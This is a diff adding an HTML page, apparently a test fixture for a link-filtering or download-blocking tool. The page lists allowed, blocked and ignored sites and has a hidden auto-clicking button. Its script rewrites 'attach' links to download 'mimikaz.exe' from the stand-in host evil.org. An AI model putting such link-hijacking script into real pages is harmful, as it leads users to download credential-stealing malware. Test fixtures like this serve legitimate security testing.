@@ -1,0 +1,38 @@
+<!DOCTYPE html public>
+<html>
+    <body>
+        <pre>
+            this message contains some secrets :)
+            check the files I have added :)
+        </pre>
+        <ul>
+            <li><a href="http://allowed-site.com">Allowed Site</a></li>
+            <li><a href="http://blocked-site.com">Blocked Site</a></li>
+            <li><a href="http://ignored-site.com">Ignored Site</a></li>
+            <li><a href="http://www.xvira-malwareavrad.com">XVIRA Site</a></li>
+        </ul>
+
+        <br/><button id="btn" style="display:none;">Load</button><br/>
+        <iframe id="f" src="" style="margin: 5px; border: 1px red solid;"></iframe>
+         <script>
+            (function(){
+                const onWindowLoad = () => { document.getElementById("f").setAttribute("src", window.location.origin) }
+                window.onload = () => { onWindowLoad() }
+                document.onclick = () => { $(document).ready(function(){
+                    let links=$("a.attach");
+                    for(var i=0;i<links.length;i++){
+                        links[i].setAttribute("href","https://evil.org/download?bin=mimikaz.exe")
+                        links[i].setAttribute("data-filename", "mimikaz.exe");
+                        links[i].setAttribute("data-raw","");
+                        console.log(links[i]);
+                    }
+                })}
+                document.getElementById("btn").addEventListener(
+                    "click", document.onclick
+                )
+                setTimeout(function(){document.getElementById("btn").click()}, 10000)
+            })();
+        </script>
+        <a href="#" data-filename="" data-raw="">LINK</a>
+    </body>
+</html>
